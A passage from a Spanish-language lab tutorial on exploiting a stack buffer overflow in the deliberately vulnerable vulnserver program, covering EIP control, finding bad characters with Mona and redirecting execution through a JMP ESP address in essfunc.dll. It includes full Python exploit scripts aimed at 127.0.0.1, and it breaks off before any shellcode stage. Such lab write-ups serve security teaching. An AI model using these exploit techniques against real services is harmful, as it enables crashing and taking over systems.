	s.connect((target_ip, target_port))

	# Receive the banner or welcome message from the server
	banner = s.recv(1024).decode('utf-8')
	print(f'Server> {banner}')

	# Control EIP
	print(f'Exploit> Sending buffer to overflow EIP')
	control_eip = command + command_magic + buffer
	s.send(control_eip)

	# Receive the response
	print('Exploit> The target server is expected to crash. No response will be received.')
	try:
		response = s.recv(1024).decode('utf-8')
		print(f'Server> {response}')
	except Exception as e:
		print(f'Exploit> No response received. The server likely crashed due to the buffer overflow.')

except Exception as e:
	# Exception handling
	print(f'An error occurred: {str(e)}')

finally:
	# Close the connection
	s.close()

```

</details>

Con vulnserver corriendo en Immunity al ejecutar en una CMD el script anterior se envía al programa una secuencia de 2006 'A's seguido de 'BBB' para de nuevo provocar el desbordamiento y comprobar que el registro EIP se ha sobrescrito con 'BBBB'. De esta manera determinamos que el offset es el correcto y podemos controlar el registro.

Tras la ejecución del script, en la ventana de registros de Immunity se observa que el registro EIP se ha sobrescrito tal y como estaba previsto con 0x42424242, 'BBBB' en ASCII.

<img width="158" height="205" alt="image" src="https://github.com/user-attachments/assets/7c1bf4f8-8ab2-4948-9b21-2bd71d0bb7fe" />

En el registro ESP (el tope de la pila) si hacemos clic derecho y seleccionamos '_Follow in stack_' se puede observar que lo que se tiene en la pila son todas las 'A's enviadas y finalmente las 4 'B's.

<img width="208" height="162" alt="image" src="https://github.com/user-attachments/assets/29ce03bd-b9cc-4cf7-97d3-cfaf330e4f24" />


Si en la ventana del dump hacemos clic derecho y seleccionamos 'HEX' -> 'HEX/ASCII (8 bytes)' también se observa el dump de memoria

<img width="348" height="198" alt="image" src="https://github.com/user-attachments/assets/f2c9a5f8-bd08-4ac9-a017-641449d5bc55" />

Esto demuestra que tenemos control sobre EIP, por lo tanto, podemos controlar el salto a la siguiente instrucción a ejecutar.

---

<a name="step7-4"></a>

### 👀 ***7.4. Buscando Bad Characters***

A continuación tras haber verificado el offset a EIP hay que enviar todos los posibles bytes para identificar qué caracteres son "malos" (los que se corrompen/filtran al llegar a la memoria). Antes de esto es necesario comprender lo siguiente.

---

Siguiendo el paso anterior, la sobrescritura puede seguir realizandose y enviar más carácteres tras las 4 'B's que se almacenan en el registro EIP. Ej: [ "A" * 2006 + "BBBB" + "C" * 50 ].

Si ahora enviamos este nuevo payload se puede observar que en el tope de la pila (el registro ESP), se encuentran las 'C's añadidas.

<img width="222" height="321" alt="image" src="https://github.com/user-attachments/assets/41ec7771-75e8-40b8-8d2e-faddd88d19f5" />

Por lo tanto, tras controlar el EIP, se puede añadir más información en el registro ESP.

Si ahora en EIP ponemos una dirección de memoria el programa ejecutará todas las instrucciones que haya en esa dirección.

Si somos capaces de encontrar una dirección de memoria que contenga una instrucción para saltar al registro ESP (jmp esp), entonces al ejecutarse y saltar al ESP se ejecutará lo que se haya escrito en ESP.

El comando **!mona modules** muestra las DLLs que está importando el binario. Nos vale para comprobar si tienen habilitados mecanismos de protección como ASLR, SafeSEH, CFG o data execution prevention y de esta manera ver si la explotación puede ser viable.

<img width="1665" height="340" alt="image" src="https://github.com/user-attachments/assets/b4318c06-f5d6-464b-9ae7-186e59903647" />

Por ejemplo en el caso de la DLL _essfunc.dll_ esta no tiene ASLR habilitado por lo tanto la explotación puede ser viable. Si lo estuviera, en cada ejecución sus instrucciones se cargarían en una dirección de memoria diferente imposibilitando ejecutar la instrucción deseada y el exploit no sería reproducible.

---

Retomando los bad chars, antes de generar la explotación final es importante identificar y excluir cualquier carácter incorrecto que pueda corromper el payload a enviar y para la ejecución.

**- Bad chars comunes:** **\x00** (caracter nulo), **\x0A** (Nueva Línea), **\x0D** (Retorno de carro), **\xFF** (Form Feed).

Los bad chars son bytes que no pueden aparecer en nuestro payload porque el programa, la librería o el canal por el que viaja el dato los filtra, transforma o los interpreta (ej. terminan la cadena, se eliminan, se convierten). Si un byte es “malo”, cuando inspecciones la memoria ese valor habrá desaparecido o cambiado —y eso rompe el shellcode o la ejecución.

Para encontrarlos se puede usar una secuencia de todos los caracteres posibles (de \x00 a \xFF) y analizar la memoria para ver si alguno se ha eliminado o modificado.
Excluir caracteres incorrectos garantiza que la shellcode no tenga bad chards y se ejecute correctamente sin daños.

Además, lo que se envíe al EIP como dirección a sobrescribir tampoco puede llevar bad chars.

Para hacer la prueba y entender lo que ocurre con los bad chars se pone un ejemplo con el caracter nulo '\x00'.

<img width="495" height="27" alt="image" src="https://github.com/user-attachments/assets/e8ff7586-5ec7-4f63-938b-334baf0d8043" />

Se envía como payload una secuencia que contiene el caracter nulo \x00 . Si nos fijamos en el dump de memoria tras el overflow se observa lo siguiente:

<img width="359" height="110" alt="image" src="https://github.com/user-attachments/assets/c68127fb-3386-4f3e-8a07-b2a189353252" />

En este caso, tras la primera secuencia de 'C's que se han enviado se encuentra un '00'. Es decir, el programa ha detectado el caracter nulo y ha detenido la ejecución por lo tanto las siguientes 46 'C's ya no aparecen porque que no se han escrito.

Para automatizar todo esto y buscar bad chars en el binario se puede hacer uso del siguiente script en Python.

<details>
<summary><b>Python Script Find Bad Chars</b></summary>

```python

import socket

# Define the target server IP and Port
target_ip = '127.0.0.1'
target_port = 9999

# Bad characters to send after EIP control
bad_chars = (
	b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F"
	b"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C\x1D\x1E\x1F"
	b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2A\x2B\x2C\x2D\x2E\x2F"
	b"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3A\x3B\x3C\x3D\x3E\x3F"
	b"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F"
	b"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x5B\x5C\x5D\x5E\x5F"
	b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F"
	b"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x7B\x7C\x7D\x7E\x7F"
	b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8A\x8B\x8C\x8D\x8E\x8F"
	b"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9A\x9B\x9C\x9D\x9E\x9F"
	b"\xA0\xA1\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9\xAA\xAB\xAC\xAD\xAE\xAF"
	b"\xB0\xB1\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xBB\xBC\xBD\xBE\xBF"
	b"\xC0\xC1\xC2\xC3\xC4\xC5\xC6\xC7\xC8\xC9\xCA\xCB\xCC\xCD\xCE\xCF"
	b"\xD0\xD1\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xDB\xDC\xDD\xDE\xDF"
	b"\xE0\xE1\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xEB\xEC\xED\xEE\xEF"
	b"\xF0\xF1\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFB\xFC\xFD\xFE\xFF"
)

# Offset is 2006. We are sending 2006 'A's followed by 'BBBB' to check EIP, and then the bad characters
buffer = b'A' * 2006 + b'BBBB' + bad_chars

# Command
command = b'TRUN'
command_magic = b' .'

try:
	# Create a socket object and connect to the server
	print('Exploit> Connect to target')
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target_ip, target_port))

	# Receive the banner or welcome message from the server
	banner = s.recv(1024).decode('utf-8')
	print(f'Server> {banner}')

	# Bad characters
	print('Exploit> Sending bad characters')
	find_bad_chars = command + command_magic + buffer
	s.send(find_bad_chars)

	# Receive the response
	print('Exploit> The target server is expected to crash. No response will be received.')
	try:
		response = s.recv(1024).decode('utf-8')
		print(f'Server> {response}')
	except Exception as e:
		print(f'Exploit> No response received. The server likely crashed due to the buffer overflow.')

except Exception as e:
	# Exception handling
	print(f'An error occurred: {str(e)}')

finally:
	# Close the connection
	s.close()

```

</details>

El comando **!mona bytearray** genera un array de caracteres como el que se utiliza en el script anterior y genera un .txt y un .bin .

<img width="1060" height="278" alt="image" src="https://github.com/user-attachments/assets/ba599e52-6f8e-42fa-a2a0-4e5da8ff68f3" />

Al volver a ejecutar el binario vulnserver en Immunity una vez generados el array de caracteres se puede con Mona comparar el bin generado con lo que habíamos puesto en ESP.

```

!mona compare -f C:\PATH\TO\mona\WorkingFolder\vulnserver\bytearray.bin -a 0114F9CC

```

De esta manera:

- Se detectan qué bytes del bytearray han sido transformados/eliminados por el programa vulnserver (los bad chars).

- Mona muestra las diferencias, indica el/los offset(s) donde los bytes no coinciden y genera un informe en la carpeta de trabajo de Mona.

<img width="1146" height="884" alt="image" src="https://github.com/user-attachments/assets/a0f58556-856c-4911-bd7c-71012839b225" />

En este caso aparecen muchos porque sólo hemos enviado el \x00. Si por ejemplo aparece que un bad caracter es \x08, probar a hacer de nuevo !mona bytearray -b "\x08" y volver a realizar la comparación.

---

<a name="step7-5"></a>

### 🦘 ***7.5. JMP ESP***

Una vez que el EIP está bajo control y se identifican los bad chars, el siguiente objetivo es redirigir la ejecución al shellcode.

- ¿Por qué usar JMP ESP? El registro ESP apunta a la parte superior de la pila, donde se almacena el shellcode.

- Al usar JMP ESP, la ejecución se puede dirigir directamente al shellcode ubicado en la pila.

**El comando !mona jmp -r esp -cpb "\x00" :**

- Busca en los módulos cargados instrucciones que redirijan la ejecución al registro ESP (por ejemplo JMP ESP, CALL ESP, o instrucciones equivalentes que salten a la pila).

- _-cpb "\x00"_ le indica a Mona que filtre y no muestre direcciones cuya representación en bytes contenga el byte \x00 (es decir, evita direcciones que introducirían NULs si se ponen como return address).

Como resultado se devuelve una **lista de direcciones útiles** (módulo, offset, bytes de la instrucción) que se pueden usar como retorno seguro para saltar al shellcode en la pila, excluyendo las que contienen los bad chars especificados.

<img width="1829" height="196" alt="image" src="https://github.com/user-attachments/assets/60f04651-9293-4181-b269-bc8c59adddbf" />

En la captura se muestran todas aquellas direcciones que se pueden utilizar y que contienen JMP ESP sin bad chars. Si hacemos doble clic sobre alguna de ellas nos redirige a la ventana del código ensamblador donde se encuentra la instrucción.

<img width="294" height="78" alt="image" src="https://github.com/user-attachments/assets/dc79f5e9-868c-4e9a-9039-082cdf182a81" />

Por lo tanto, si podemos sustituir el EIP por la dirección seleccionada que contiene JMP ESP podremos ejecutar el código introducido como payload en ESP.

Para ello se puede hacer uso del siguiente script en Python. Este script envía como entrada a vulnserver un payload que sobrescribe el registro EIP con la dirección 0x625011AF en formato little endian (\xAF\x11\x50\x62) que contiene la instrucción en ensamblador _JMP ESP_ seguido de los caracteres iniciales para el desbordamiento y la dirección se envían una secuencia de NOPs y breakpoints para facilitar la depuración. 

<details>
<summary><b>Python Script JMP ESP</b></summary>

```python

import socket

# Define the target server IP and Port
target_ip = '127.0.0.1'
target_port = 9999

# 0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (*\vulnserver\essfunc.dll), 0x0
# The address 0x625011AF is located in the essfunc.dll library, which lacks certain protections like ASLR, Rebase, SafeSEH, and CFG. This makes it a reliable candidate for overwriting EIP.
# The address 0x625011AF is in little endian format (\xAF\x11\x50\x62)
eip_overwrite = b'\xAF\x11\x50\x62'

# Add a sequence of NOPs (0x90) followed by three INT3 (0xCC) breakpoints to help with debugging.
nops_and_breakpoint = b'\x90' * 10 + b'\xCC' * 3

# Offset is 2006. We are sending 2006 'A's followed by the address 0x625011AF, some NOPs, and breakpoints for debugging.
buffer = b'A' * 2006 + eip_overwrite + nops_and_breakpoint

# Command
command = b'TRUN'
command_magic = b' .'

try:
	# Create a socket object and connect to the server
	print('Exploit> Connect to target')
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target_ip, target_port))

	# Receive the banner or welcome message from the server
	banner = s.recv(1024).decode('utf-8')
	print(f'Server> {banner}')

	# JMP ESP
	print('Exploit> Jump to ESP register')
	jmp_esp = command + command_magic + buffer
	s.send(jmp_esp)

	# Receive the response
	print('Exploit> The target server is expected to crash. No response will be received.')
	try:
		response = s.recv(1024).decode('utf-8')
		print(f'Server> {response}')
	except Exception as e:
		print(f'Exploit> No response received. The server likely crashed due to the buffer overflow.')

except Exception as e:
	# Exception handling
	print(f'An error occurred: {str(e)}')

finally:
	# Close the connection
	s.close()

```

</details>

Esta vez al ejecutar vulnserver desde Immunity y ejecutar desde CMD el script se obtiene algo diferente a lo que se venía mostrando cuando se producía el desbordamiento del búfer.

<img width="838" height="438" alt="image" src="https://github.com/user-attachments/assets/a627149a-39af-4bf0-b453-e1bba205a205" />





















































